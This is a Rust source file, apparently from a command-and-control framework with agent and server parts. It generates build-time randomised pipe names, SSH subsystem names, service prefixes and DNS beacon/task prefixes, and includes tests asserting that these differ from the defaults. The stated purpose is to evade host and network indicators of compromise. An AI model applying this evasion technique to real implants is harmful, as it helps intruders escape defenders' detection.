//! Compile-time randomised IoC (Indicator of Compromise) strings.
//!
//! These constants replace hardcoded default strings (pipe names, subsystem
//! identifiers, service prefixes, DNS prefixes) that would otherwise be
//! trivial network/host-based indicators.  Each value is generated at build
//! time from a deterministic seed so that both the agent and the server
//! reference the same strings.
//!
//! The seed source (first wins):
//!   1. `ORCHESTRA_IOC_SEED` environment variable
//!   2. Auto-generated from system time + default constant
//!
//! For reproducible / synchronised builds, set `ORCHESTRA_IOC_SEED` to the
//! same value when building both the agent and the server.

pub mod generated {
    include!(concat!(env!("OUT_DIR"), "/ioc_strings.rs"));
}

pub use generated::*;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ioc_strings_are_non_empty() {
        assert!(!IOC_PIPE_NAME.is_empty(), "pipe name must not be empty");
        assert!(
            !IOC_SSH_SUBSYSTEM.is_empty(),
            "SSH subsystem must not be empty"
        );
        assert!(
            !IOC_SERVICE_PREFIX.is_empty(),
            "service prefix must not be empty"
        );
        assert!(
            !IOC_DNS_BEACON.is_empty(),
            "DNS beacon prefix must not be empty"
        );
        assert!(!IOC_DNS_TASK.is_empty(), "DNS task prefix must not be empty");
    }

    #[test]
    fn pipe_name_is_not_default() {
        assert_ne!(
            IOC_PIPE_NAME, "orchestra",
            "pipe name must not be the default IoC"
        );
    }

    #[test]
    fn ssh_subsystem_is_not_default() {
        assert_ne!(
            IOC_SSH_SUBSYSTEM, "orchestra",
            "SSH subsystem must not be the default IoC"
        );
    }

    #[test]
    fn service_prefix_is_not_default() {
        assert_ne!(
            IOC_SERVICE_PREFIX, "orch",
            "service prefix must not be the default IoC"
        );
    }

    #[test]
    fn dns_beacon_is_not_default() {
        assert_ne!(
            IOC_DNS_BEACON, "beacon",
            "DNS beacon prefix must not be the default IoC"
        );
    }

    #[test]
    fn dns_task_is_not_default() {
        assert_ne!(
            IOC_DNS_TASK, "task",
            "DNS task prefix must not be the default IoC"
        );
    }

    #[test]
    fn pipe_name_is_alphanumeric() {
        assert!(
            IOC_PIPE_NAME.chars().all(|c| c.is_ascii_alphanumeric()),
            "pipe name must be alphanumeric: {IOC_PIPE_NAME}"
        );
    }

    #[test]
    fn ssh_subsystem_is_alphanumeric() {
        assert!(
            IOC_SSH_SUBSYSTEM
                .chars()
                .all(|c| c.is_ascii_alphanumeric()),
            "SSH subsystem must be alphanumeric: {IOC_SSH_SUBSYSTEM}"
        );
    }

    #[test]
    fn service_prefix_is_alpha() {
        assert!(
            IOC_SERVICE_PREFIX.chars().all(|c| c.is_ascii_alphabetic()),
            "service prefix must be alphabetic: {IOC_SERVICE_PREFIX}"
        );
    }

    #[test]
    fn dns_beacon_is_alphanumeric() {
        assert!(
            IOC_DNS_BEACON.chars().all(|c| c.is_ascii_alphanumeric()),
            "DNS beacon prefix must be alphanumeric: {IOC_DNS_BEACON}"
        );
    }

    #[test]
    fn service_prefix_has_expected_length() {
        assert_eq!(
            IOC_SERVICE_PREFIX.len(),
            4,
            "service prefix must be exactly 4 chars"
        );
    }
}
